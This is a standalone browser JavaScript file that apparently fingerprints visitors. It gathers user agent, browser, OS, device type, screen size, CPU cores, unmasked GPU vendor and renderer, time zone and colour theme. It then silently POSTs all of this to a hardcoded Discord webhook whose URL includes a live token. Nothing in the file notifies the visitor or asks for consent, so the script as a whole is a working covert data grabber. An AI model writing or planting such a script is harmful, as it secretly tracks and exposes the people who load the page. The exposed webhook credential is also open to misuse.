// User agent and browser detection
var userAgent = navigator.userAgent;
var browserName = navigator.appName, browserVersion = "";
if (userAgent.indexOf("Firefox") !== -1) {
  browserName = "Firefox";
  browserVersion = userAgent.split("Firefox/")[1];
} else if (userAgent.indexOf("Edg") !== -1) {
  browserName = "Microsoft Edge";
  browserVersion = userAgent.split("Edg/")[1];
} else if (userAgent.indexOf("OPR") !== -1 || userAgent.indexOf("Opera") !== -1) {
  browserName = "Opera";
  browserVersion = userAgent.split(userAgent.indexOf("OPR") !== -1 ? "OPR/" : "Opera/")[1];
} else if (userAgent.indexOf("Chrome") !== -1) {
  browserName = "Google Chrome";
  browserVersion = userAgent.split("Chrome/")[1].split(" ")[0];
} else if (userAgent.indexOf("Safari") !== -1) {
  browserName = "Safari";
  browserVersion = userAgent.split("Version/")[1].split(" ")[0];
}

// Screen size
const screenWidth = window.screen.width, screenHeight = window.screen.height;

// Core
var cc = navigator.hardwareConcurrency;

// Operating system detection
var osName = "Unknown OS";
if (userAgent.indexOf("Windows NT") !== -1) {
  osName = "Windows " + (userAgent.match(/Windows NT (\d+\.\d+)/) || [])[1];
} else if (userAgent.indexOf("KAIOS") !== -1) {
  osName = "KAI OS";
} else if (userAgent.indexOf("Android") !== -1) {
  osName = "Android";
} else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
  osName = "iOS";
} else if (userAgent.indexOf("Mac") !== -1) {
  osName = "Macintosh";
} else if (userAgent.indexOf("Linux") !== -1) {
  osName = "Linux";
}

// Device name detection
let deviceName = 'Unknown';
if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
  deviceName = 'iOS Device';
} else if (/KAIOS/i.test(userAgent)) {
  deviceName = 'KAI OS Device';
} else if (/Android/i.test(userAgent)) {
  deviceName = 'Android Device';
} else if (/Windows/i.test(userAgent)) {
  deviceName = 'Windows PC';
} else if (/Mac/i.test(userAgent)) {
  deviceName = 'Macintosh';
} else if (/Linux/i.test(userAgent)) {
  deviceName = 'Linux PC';
} else if (/CrOS/.test(userAgent)) {
  deviceName = 'Chromebook';
} else if (/PlayStation/.test(userAgent)) {
  deviceName = 'PlayStation';
} else if (/Xbox/.test(userAgent)) {
  deviceName = 'Xbox';
} else if (/Nintendo/.test(userAgent)) {
  deviceName = 'Nintendo';
}

// GPU detection
var canvas = document.createElement('canvas');
var gl, debugInfo, ven = "", ren = "";
try {
  gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  }
} catch (e) {}

// User's device time and time zone detection
var now = new Date(), timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

// Theme color detection
var themeColor = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';

// Prepare the data for the webhook
var data = {
  content: "Collected device information:",
  embeds: [
    {
      title: "Device Information",
      fields: [
        { name: "User Agent", value: userAgent, inline: false },
        { name: "Theme Color", value: themeColor, inline: true },
        { name: "Device Time", value: now.toString(), inline: true },
        { name: "Time Zone", value: timeZone, inline: true },
        { name: "CPU Cores", value: cc.toString(), inline: true },
        { name: "GPU Vendor", value: ven, inline: true },
        { name: "GPU Renderer", value: ren, inline: true },
        { name: "Browser Name", value: browserName, inline: true },
        { name: "Browser Version", value: browserVersion, inline: true },
        { name: "Screen Width", value: screenWidth.toString(), inline: true },
        { name: "Screen Height", value: screenHeight.toString(), inline: true },
        { name: "OS Name", value: osName, inline: true },
        { name: "Device Name", value: deviceName, inline: true }
      ]
    }
  ]
};

// Send the data to the Discord webhook
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://discord.com/api/webhooks/1259066790445846598/HVjlzgvmChBRRz2dJH_SgGodHbemr-sP3i0rXLwXTOUA6ooAzLOXaP8NI4JhwikiU96g", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 204) {
    console.log("Data sent to Discord successfully!");
  }
};
xhr.send(JSON.stringify(data));
